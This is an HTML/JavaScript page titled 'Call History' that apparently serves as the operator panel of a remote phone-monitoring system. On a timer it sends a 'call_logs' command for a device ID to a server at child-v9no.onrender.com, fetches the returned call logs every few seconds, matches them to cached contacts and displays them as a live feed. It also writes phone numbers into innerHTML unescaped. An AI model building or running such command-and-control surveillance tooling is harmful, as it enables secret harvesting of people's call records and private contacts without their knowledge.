<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Call History</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --glass-bg: #1c1c1e;
            --border-color: #2c2c2e;
            --text-main: #ffffff;
            --text-sub: #8e8e93;
            --incoming: #30d158; /* Green */
            --outgoing: #0a84ff; /* Blue */
            --missed: #ff453a;   /* Red */
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0; padding: 10px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 500px;
            background: #000;
            min-height: 100vh;
        }

        /* --- Header --- */
        .header {
            position: sticky; top: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(12px);
            z-index: 100;
            padding: 15px 10px;
            border-bottom: 1px solid var(--border-color);
            display: flex; justify-content: space-between; align-items: center;
        }

        .header-left { display: flex; align-items: center; gap: 10px; }

        .back-btn {
            color: #0a84ff; font-size: 1.1rem; text-decoration: none;
            display: flex; align-items: center; gap: 5px;
        }

        .page-title { font-size: 1.2rem; font-weight: 700; }

        .live-status {
            font-size: 0.75rem; color: var(--incoming);
            display: flex; align-items: center; gap: 6px;
            background: rgba(48, 209, 88, 0.15);
            padding: 5px 10px; border-radius: 20px;
            font-weight: bold;
        }

        .live-dot {
            width: 8px; height: 8px; background-color: var(--incoming);
            border-radius: 50%;
            animation: blink 1.5s infinite;
        }

        @keyframes blink { 50% { opacity: 0.4; } }

        .refresh-btn {
            background: none; border: none; color: var(--text-main);
            font-size: 1.1rem; cursor: pointer;
        }

        /* --- Log List --- */
        .log-list {
            display: flex; flex-direction: column;
            padding-bottom: 20px;
        }

        .log-card {
            padding: 12px 10px;
            display: flex; align-items: center;
            border-bottom: 1px solid var(--border-color);
            transition: background 0.2s;
        }

        .log-card:active { background: #1c1c1e; }

        .icon-box {
            width: 40px; height: 40px;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.1rem; margin-right: 15px;
        }

        .icon-box.incoming { color: var(--text-sub); } /* Standard iOS style usually greyish for regular calls */
        .icon-box.outgoing { color: var(--text-sub); }
        .icon-box.missed { color: var(--missed); }

        .info-box { flex: 1; overflow: hidden; }

        .name-row {
            font-size: 1.05rem; font-weight: 600; color: #fff;
            margin-bottom: 4px;
            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
        }
        
        .name-row.is-missed { color: var(--missed); }

        .details-row {
            display: flex; align-items: center; gap: 6px;
            font-size: 0.85rem; color: var(--text-sub);
        }

        .call-btn {
            width: 35px; height: 35px;
            display: flex; align-items: center; justify-content: center;
            color: var(--outgoing); font-size: 1.2rem;
            text-decoration: none; margin-left: 10px;
        }

    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="header-left">
                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
                <span class="page-title">Recents</span>
            </div>
            
            <div class="live-status">
                <div class="live-dot"></div>
                <span>LIVE</span>
            </div>
        </div>

        <div id="logsContainer" class="log-list">
            <div style="text-align: center; color: #666; margin-top: 50px;">
                <i class="fa-solid fa-spinner fa-spin"></i> Loading...
            </div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');
        const storageKey = `calls_${DEVICE_ID}`;
        
        // Cache for Contacts (Names)
        let cachedContacts = [];

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) return alert("Device ID Missing");
            
            // 1. Try to load saved contacts from other pages
            loadContactsCache();
            
            // 2. Load old logs instantly
            const savedData = localStorage.getItem(storageKey);
            if (savedData) renderLogs(JSON.parse(savedData));

            // 3. Start Live Updates
            startLiveSystem();
        });

        function loadContactsCache() {
            // Hum localStorage check karenge agar wahan contacts saved hain
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes("contact")) {
                    try {
                        const data = JSON.parse(localStorage.getItem(key));
                        if (Array.isArray(data)) cachedContacts = data;
                    } catch(e) {}
                }
            }
        }

        function getContactName(number) {
            if (!cachedContacts.length || !number) return null;
            const cleanLogNum = number.toString().replace(/\D/g, '').slice(-10);
            
            const match = cachedContacts.find(c => {
                const cNum = (c.number || c.phone || "").toString().replace(/\D/g, '').slice(-10);
                return cNum === cleanLogNum;
            });
            return match ? match.name : null;
        }

        function startLiveSystem() {
            sendCommand();
            fetchLogs();
            setInterval(sendCommand, 10000); // Har 10 sec mein command
            setInterval(fetchLogs, 4000);    // Har 4 sec mein data check
        }

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'call_logs' })
            }).catch(() => {});
        }

        function fetchLogs() {
            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${Date.now()}`)
                .then(res => res.json())
                .then(data => {
                    if (data && data.length > 0) {
                        localStorage.setItem(storageKey, JSON.stringify(data));
                        renderLogs(data);
                    }
                })
                .catch(e => console.log("Waiting for connection..."));
        }

        // --- DATE FORMATTER (12 Hour Fix) ---
        function formatTime(timestamp) {
            if (!timestamp) return "";
            
            // Fix timestamp format (seconds vs ms)
            let dateObj;
            if (String(timestamp).length === 10) dateObj = new Date(timestamp * 1000);
            else dateObj = new Date(timestamp);

            if (isNaN(dateObj.getTime())) return "";

            // 12 Hour Format (e.g. 10:30 PM)
            const timeStr = dateObj.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
            
            // Check if Today/Yesterday
            const now = new Date();
            const yesterday = new Date(now);
            yesterday.setDate(yesterday.getDate() - 1);

            if (dateObj.toDateString() === now.toDateString()) {
                return timeStr; // Aaj hai toh sirf time
            } else if (dateObj.toDateString() === yesterday.toDateString()) {
                return `Yesterday`;
            } else {
                return dateObj.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
            }
        }

        function renderLogs(data) {
            const container = document.getElementById("logsContainer");
            if (!data.length) {
                container.innerHTML = '<div style="text-align: center; color: #666; margin-top: 50px;">No logs found.</div>';
                return;
            }

            // Sort: Newest first
            data.sort((a, b) => (b.date || b.timestamp || 0) - (a.date || a.timestamp || 0));

            let html = "";
            data.forEach(log => {
                const type = (log.type || "").toLowerCase();
                let iconClass = "incoming";
                let icon = "fa-phone-arrow-down-left"; // Incoming
                let isMissed = false;
                let typeText = "Incoming";

                if (type.includes("outgoing")) {
                    iconClass = "outgoing";
                    icon = "fa-phone-arrow-up-right";
                    typeText = "Outgoing";
                } else if (type.includes("missed") || type.includes("rejected")) {
                    iconClass = "missed";
                    icon = "fa-phone-slash";
                    isMissed = true;
                    typeText = "Missed";
                }

                const savedName = getContactName(log.number);
                const displayName = savedName || log.number;
                const displaySub = savedName ? `${typeText} • ${log.number}` : typeText;
                const timeString = formatTime(log.date || log.timestamp || log.time);

                html += `
                    <div class="log-card">
                        <div class="icon-box ${iconClass}">
                            <i class="fa-solid ${icon}"></i>
                        </div>
                        <div class="info-box">
                            <div class="name-row ${isMissed ? 'is-missed' : ''}">${displayName}</div>
                            <div class="details-row">
                                <i class="fa-solid fa-clock" style="font-size: 0.7rem;"></i>
                                ${displaySub} &nbsp;•&nbsp; ${timeString}
                            </div>
                        </div>
                        <a href="tel:${log.number}" class="call-btn">
                            <i class="fa-regular fa-circle-play"></i>
                        </a>
                    </div>
                `;
            });
            container.innerHTML = html;
        }
    </script>
</body>
</html>
